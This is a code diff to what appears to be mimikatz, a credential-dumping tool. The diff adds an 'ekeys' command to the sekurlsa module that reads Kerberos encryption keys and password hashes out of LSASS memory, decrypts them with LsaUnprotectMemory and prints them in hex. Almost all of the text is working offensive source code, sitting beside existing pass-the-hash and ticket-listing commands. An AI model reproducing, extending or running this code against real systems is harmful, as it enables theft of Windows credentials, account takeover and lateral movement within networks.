@@ -20,6 +20,7 @@ const KUHL_M_C kuhl_m_c_sekurlsa[] = {
 
 	{kuhl_m_sekurlsa_msv_pth,			L"pth",		L"Pass-the-hash"},
 	{kuhl_m_sekurlsa_kerberos_tickets,	L"tickets",	L"List Kerberos tickets"},
+	{kuhl_m_sekurlsa_kerberos_keys,		L"ekeys",	L"List Kerberos Encryption Keys"},
 	{kuhl_m_sekurlsa_dpapi,				L"dpapi",	L"List Cached MasterKeys"},
 	{kuhl_m_sekurlsa_credman,			L"credman",	L"List Credentials Manager"},
 };
@@ -424,6 +425,8 @@ VOID kuhl_m_sekurlsa_genericCredsOutput(PKIWI_GENERIC_PRIMARY_CREDENTIAL mesCred
 	PUNICODE_STRING credentials, username = NULL, domain = NULL, password = NULL;
 	PMSV1_0_PRIMARY_CREDENTIAL pPrimaryCreds;
 	PRPCE_CREDENTIAL_KEYCREDENTIAL pRpceCredentialKeyCreds;
+	PKERB_HASHPASSWORD_GENERIC pHashPassword;
+	UNICODE_STRING buffer;
 	PVOID base;
 	DWORD type, i;
 	
@@ -477,6 +480,21 @@ VOID kuhl_m_sekurlsa_genericCredsOutput(PKIWI_GENERIC_PRIMARY_CREDENTIAL mesCred
 					LocalFree(mesCreds->UserName.Buffer);
 				}
 			}
+		}
+		else if(flags & KUHL_SEKURLSA_CREDS_DISPLAY_KEY_LIST)
+		{
+			pHashPassword = (PKERB_HASHPASSWORD_GENERIC) mesCreds;
+			kprintf(L"\t %4i : ", pHashPassword->Type);
+			buffer.Buffer = (PWSTR) pHashPassword->Checksump;
+			buffer.Length = buffer.MaximumLength = (USHORT) ((pHashPassword->Size) ? pHashPassword->Size : LM_NTLM_HASH_LENGTH); // will not use CDLocateCSystem, sorry!
+			if(kull_m_string_getUnicodeString(&buffer, cLsass.hLsassMem))
+			{
+				if(!(flags & KUHL_SEKURLSA_CREDS_DISPLAY_NODECRYPT)/* && *lsassLocalHelper->pLsaUnprotectMemory*/)
+					(*lsassLocalHelper->pLsaUnprotectMemory)(buffer.Buffer, buffer.MaximumLength);
+				kull_m_string_wprintf_hex(buffer.Buffer, buffer.Length, 0);
+				LocalFree(buffer.Buffer);
+			}
+			kprintf(L"\n");
 		}
 		else
 		{
